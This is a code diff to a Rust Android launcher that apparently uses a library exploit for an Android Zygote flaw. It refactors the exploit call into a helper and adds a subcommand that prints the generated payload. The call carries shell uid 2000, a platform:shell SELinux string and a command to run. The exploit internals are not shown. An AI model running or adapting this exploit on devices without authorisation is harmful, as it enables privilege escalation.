@@ -2,9 +2,9 @@
 extern crate log;
 extern crate android_logger;
 
-use std::env::current_exe;
+use std::{env::current_exe, path::PathBuf};
 
-use android_31317_exploit::exploit::{ExploitKind, execute};
+use android_31317_exploit::exploit::{ExploitKind, execute, payload};
 use android_logger::Config;
 use clap::Parser;
 use controller::Controller;
@@ -28,6 +28,8 @@ enum Args {
     Controller,
     /// Specializes this process as the worker, pid 1000 (shell), process
     Worker,
+    /// Create custom exploit payload. NOTE: This is for internal use; rely on the pinitd for launching other processes
+    BuildPayload,
 }
 
 fn main() {
@@ -49,14 +51,8 @@ fn run() -> Result<(), Error> {
             // Spawn only the controller
             init_logging_with_tag(None);
             warn!("Requesting controller start");
-            Ok(execute(
-                2000,
-                "/data/local/tmp/",
-                "com.android.shell",
-                "platform:shell:targetSdkVersion=29:complete",
-                ExploitKind::Command(format!("{} controller", executable.display())),
-                Some("com.android.shell"),
-            )?)
+            let payload = init_payload(executable)?;
+            Ok(execute(&payload, None)?)
         }
         Args::Controller => {
             // Spawn the worker and enter work loop
@@ -68,6 +64,13 @@ fn run() -> Result<(), Error> {
             init_logging_with_tag(Some("pinit-worker".into()));
             warn!("Starting worker");
             Ok(Worker::create()?)
+        }
+        Args::BuildPayload => {
+            init_logging_with_tag(None);
+            warn!("Building init payload only");
+            let payload = init_payload(executable)?;
+            println!("{payload}");
+            Ok(())
         }
     }
 }
@@ -82,4 +85,15 @@ fn init_logging_with_tag(tag: Option<String>) {
     };
 
     android_logger::init_once(config.with_max_level(LevelFilter::Trace));
+}
+
+fn init_payload(executable: PathBuf) -> Result<String, Error> {
+    Ok(payload(
+        2000,
+        "/data/local/tmp/",
+        "com.android.shell",
+        "platform:shell:targetSdkVersion=29:complete",
+        &ExploitKind::Command(format!("{} controller", executable.display())),
+        Some("com.android.shell"),
+    )?)
 }
